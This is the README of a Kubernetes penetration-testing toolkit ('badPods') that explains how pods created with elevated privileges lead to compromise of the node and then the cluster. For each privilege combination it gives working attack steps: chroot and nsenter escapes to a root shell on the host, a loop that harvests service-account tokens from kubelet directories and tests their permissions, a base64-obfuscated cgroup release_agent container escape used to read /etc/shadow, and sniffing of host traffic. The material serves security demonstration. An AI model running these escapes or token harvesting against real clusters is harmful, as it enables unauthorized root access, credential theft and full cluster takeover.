# badPods

A collection of yamls that will create pods with different elevated privileges. The goal is to help you quickly understand and demonstrate the impact of allowing specific security sensitive pod specifications, and some common combinations.

## Background
Occasionally, containers within pods need access to privileged resources on the host, so the Kubernetes pod spec allows for it. However, this level of access should be granted with extreme caution. Administrators have ways to prevent the creation of pods with these security sensitive pod specifications, but it is not always clear what the real-world security implications of allowing certain attributes is. 

## Prerequisites

1. Access to a cluster 
1. Permission to create pods in at least one namespace. If you can exec into them that makes life easier.  
1. A pod security policy (or other pod admission controller's logic) that allows pods to be created with one or more security sensitive attributes, or no pod security policy / pod admission controller at all


## Summary



Allowed Specification | What's the worst that can happen? | How?
-- | -- | -- 
ALL | Multiple likely paths to full cluster compromise (all resources in all namespaces) <img width=800/>| Once you create the pod, you can exec into it and you will have root access on the node running your pod. Your best hope is that you can schedule your pod to run on the master node (not possible in a cloud managed environment). Regardless of whether you are on the master node or a worker, you can access the node's kubelet creds, you can create mirror pods in any namespace, and you can access any secret mounted within any pod on the node you are on and use it to gain access to other namespaces. <br> [pod-chroot-node.yaml](yaml/pod-chroot-node.yaml)
hostPID + privileged |  Same as above | Same as above <br> [pod-priv-and-hostpid.yaml](yaml/pod-priv-and-hostpid.yaml)
privileged=true | Same as above | While you will eventually get an interactive shell on the node like in the cases above, you start with non-interactive command execution and you'll have to upgrade it if you want interactive access. The privesc paths are the same as above. <br> [pod-priv-only.yaml](yaml/pod-priv-only.yaml)
Unrestricted hostmount (/) | Same as above | While you don't have access to host process or network namespaces, having access to the full filesystem allows you to perform the same types of privesc paths outlined above. Hunt for tokens from other pods running on the node and hope you find a token associated with a highly privileged service account.  <br> [pod-hostnetwork-only.yaml](yaml/pod-hostnetwork-only.yaml)
hostpid | Unlikely but possible path to cluster compromise <br> | You can access any secrets visible via ps -aux.  Look for passwords, tokens, keys and use them to privesc within the cluster, to services supported by the cluster, or to services that applications in the cluster are communicating with. It is a long shot, but you might find a kubernetes token or some other authentication material that will allow you to access other namespaces and eventually escalate all the way up to cluster-admin.   You can also kill any process on the node (DOS) <br> [pod-hostpid-only.yaml](yaml/pod-hostpid-only.yaml)
hostnetwork | Potential path to cluster compromise | Sniff unencrypted traffic on any interface and potentially find service account tokens or other sensitive information <br> Communicate with services that only listen on loopback, etc. <br> [pod-hostnetwork-only.yaml](yaml/pod-hostnetwork-only.yaml)

hostipc | Not much on its own unless some services on the host are using hostIPC  <br> [pod-hostipc-only.yaml](yaml/pod-hostipc-only.yaml)


Caveat: There are many kubernetes specific security controls available to administrators that can reduce the impact of pods created with the following privileges. As is always the case with penetration testing, your milage may vary.


# Usage
 Each pod spec in the yamls directory targets a specific attribute or a combination of attributes that expose your cluster to risk. 



## Easy mode pod - You can create a pod with to all the things
If there are no pod admission controllers applied,or a really lax policy, you can create a pod that has complete access to the host node. You essentially have a root shell on the host, which provides a path to cluster-admin. 

[pod-chroot-node.yaml](yaml/pod-chroot-node.yaml)

### Create a pod
```bash
# Option 1: Create pod from local yaml 
kubectl apply -f pod-chroot-node.yaml [-n namespace] 
# Option 2: Create pod from github hosted yaml
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/pod-chroot-node.yaml [-n namespace] 
```

### Exec into pod 
```bash
kubectl -n [namespace] exec -it pod-chroot-node -- chroot /host

```

### Post exploitation
```bash
# You now have full root access to the node
# Example privesc path: Hunt for tokens in /host/var/lib/kubelet/pods/
tokens=`find /var/lib/kubelet/pods/ -name token -type l`; for token in $tokens; do parent_dir="$(dirname "$token")"; namespace=`cat $parent_dir/namespace`; echo $namespace "|" $token ; done | sort

default | /var/lib/kubelet/pods/GUID/volumes/kubernetes.io~secret/default-token-t25ss/token
default | /var/lib/kubelet/pods/GUID/volumes/kubernetes.io~secret/default-token-t25ss/token
development | /var/lib/kubelet/pods/GUID/volumes/kubernetes.io~secret/default-token-qqgjc/token
development | /var/lib/kubelet/pods/GUID/volumes/kubernetes.io~secret/default-token-qqgjc/token
kube-system | /var/lib/kubelet/pods/GUID/volumes/kubernetes.io~secret/kube-proxy-token-x6j9x/token
kube-system | /var/lib/kubelet/pods/GUID/volumes/kubernetes.io~secret/calico-node-token-d426t/token

#Copy token to somewhere you have kubectl set and see what permissions it has assigned to it
DTOKEN=`cat /var/lib/kubelet/pods/GUID/volumes/kubernetes.io~secret/default-token-qqgjc/token`
kubectl auth can-i --list --token=$DTOKEN -n development # Shows namespace specific permissions
kubectl auth can-i --list --token=$DTOKEN #Shows cluster wide permissions

# Does the token allow you to view secrets in that namespace? How about other namespaces?
# Does it allow you to create clusterrolebindings? Can you bind your user to cluster-admin?
```
   
Reference(s): 
* https://raesene.github.io/blog/2019/04/01/The-most-pointless-kubernetes-command-ever/



## Nsenter pod - You can create a pod with privileged: true + hostPID

If you have `privileged=true` and `hostPID` available to you, you can use the `nsenter` command in the pod to enter PID=1 on the host, which allows also you gain a root shell on the host, which provides a path to cluster-admin. 

[pod-priv-and-hostpid.yaml](yaml/pod-priv-and-hostpid.yaml)

### Create a pod
```bash
# Option 1: Create pod from local yaml 
kubectl apply -f pod-priv-and-hostpid.yaml [-n namespace] 
# Option 2: Create pod from github hosted yaml
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/pod-priv-and-hostpid.yaml [-n namespace] 
```

### Exec into pod 
```bash
kubectl -n [namespace] exec -it pod-priv-and-hostpid -- bash
```

### Post exploitation
```bash
# Use nsenter to gain full root access on the node
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
# You now have full root access to the node
```

# Example privesc path: Hunt for tokens in /host/var/lib/kubelet/pods/
# See notes from easymode pod

Reference(s): 
* https://twitter.com/mauilion/status/1129468485480751104
* https://github.com/kvaps/kubectl-node-shell

## Privonly pod - You can create a pod with only privileged: true

If you only have `privileged=true`, you can still get RCE on the host, and ultimately cluster-admin, but the path is more tedious. The exploit below escapes the container and allows you to run one command at a time. From there, you can launch a reverse shell.  

[pod-priv-only.yaml](yaml/pod-priv-only.yaml)

### Create a pod
```bash
# Option 1: Create pod from local yaml 
kubectl apply -f pod-priv-only.yaml  [-n namespace] 
# Option 2: Create pod from github hosted yaml
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/pod-priv-only.yaml [-n namespace] 
```

### Exec into pod 
```bash
kubectl -n [namespace] exec -it pod-priv-only -- bash
```

### Post exploitation
```bash
# Create undock script that will automate the container escape POC
echo ZD1gZGlybmFtZSAkKGxzIC14IC9zKi9mcy9jKi8qL3IqIHxoZWFkIC1uMSlgCm1rZGlyIC1wICRkL3c7ZWNobyAxID4kZC93L25vdGlmeV9vbl9yZWxlYXNlCnQ9YHNlZCAtbiAncy8uKlxwZXJkaXI9XChbXixdKlwpLiovXDEvcCcgL2V0Yy9tdGFiYAp0b3VjaCAvbzsgZWNobyAkdC9jID4kZC9yZWxlYXNlX2FnZW50O2VjaG8gIiMhL2Jpbi9zaAokMSA+JHQvbyIgPi9jO2NobW9kICt4IC9jO3NoIC1jICJlY2hvIDAgPiRkL3cvY2dyb3VwLnByb2NzIjtzbGVlcCAxO2NhdCAvbwo= | base64 -d > undock.sh 
# Then use the script to run whatever commands you want on the host: 
sh undock.sh "cat /etc/shadow"
```

Reference(s): 
* https://twitter.com/_fel1x/status/1151487051986087936
* https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/ 


## hostPIDonly pod - You can create a pod with only hostPID

If you only have `hostPID=true`, you most likely won't get RCE on the host, but you might find sensitive application secrets that belong to pods in other namespaces. This can be use to gain unauthorized access to applications and services in other namespaces or outside the cluster, and can potentially be used to further comprise the cluster. 

[pod-hostpid-only.yaml](yaml/pod-hostpid-only.yaml)

### Create a pod
```bash
# Option 1: Create pod from local yaml 
kubectl apply -f pod-hostpid-only.yaml  [-n namespace] 
# Option 2: Create pod from github hosted yaml
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/pod-hostpid-only.yaml [-n namespace] 
```

### Exec into pod 
```bash 
kubectl -n [namespace] exec -it pod-hostpid-only -- bash
```
### Post exploitation
```bash
# View all processes running on the host and look for passwords, tokens, keys, etc.
ps -aux
# You can also kill any process, but don't do that in production :)
```

## hostNetwork pod - You can create a pod with only hostNetwork

If you only have `hostNetwork=true`, you can't get RCE on the host directly, but if your cross your fingers you might still find a path to cluster admin. 
The important things here are: 
* You can sniff traffic on any of the host's network interfaces, and maybe find some kubernetes tokens or application specific passwords, keys, etc. to other services in the cluster.  
* You can communicate with network services on the host that are only listening on localhost/loopback. Services you would not be able to touch without `hostNetowrk=true`

[pod-hostnetwork-only.yaml](yaml/pod-hostnetwork-only.yaml)


### Create pod
```bash 
# Option 1: Create pod from local yaml 
kubectl apply -f pod-hostnetwork-only.yaml  [-n namespace] 

# Option 2: Create pod from github hosted yaml
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/pod-hostnetwork-only.yaml [-n namespace] 
```

### Exec into pod 

```bash
kubectl -n [namespace] exec -it pod-hostnetwork-only -- bash
```

### Post Exploitation 
```bash
# Install tcpdump and sniff traffic 
# Note: If you can't install tools to your pod (no internet access), you will have to change the image in your pod yaml to something that already includes tcpdump, like https://hub.docker.com/r/corfr/tcpdump

apt update && apt install tcpdump 



# Or investigate local services
curl https://localhost:1234/metrics
```


## hostIPC pod - You can create a pod with only hostIPC

If you only have `hostIPC=true`, you most likely can't do much. What you should do is use the ipcs command inside your hostIPC container to see if there are any ipc resources (shared memory segments, message queues, or semephores). If you find one, you will likely need to create a program that can read them. 

[pod-hostipc-only.yaml](yaml/pod-hostipc-only.yaml)

### Create pod
```bash
# Option 1: Create pod from local yaml 
kubectl apply -f pod-hostipc-only.yaml  [-n namespace] 

# Option 2: Create pod from github hosted yaml
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/pod-hostipc-only.yaml [-n namespace] 
```

### Exec into pod 
```bash
kubectl -n [namespace] exec -it pod-hostipc-only -- bash
```

### Post exploitation 
```bash
# Look for any use of inter-process communication on the host 
ipcs -a
```

Reference: https://opensource.com/article/20/1/inter-process-communication-linux


# Remove pods
kubectl -n [namespace] delete -f pod-file-name.yaml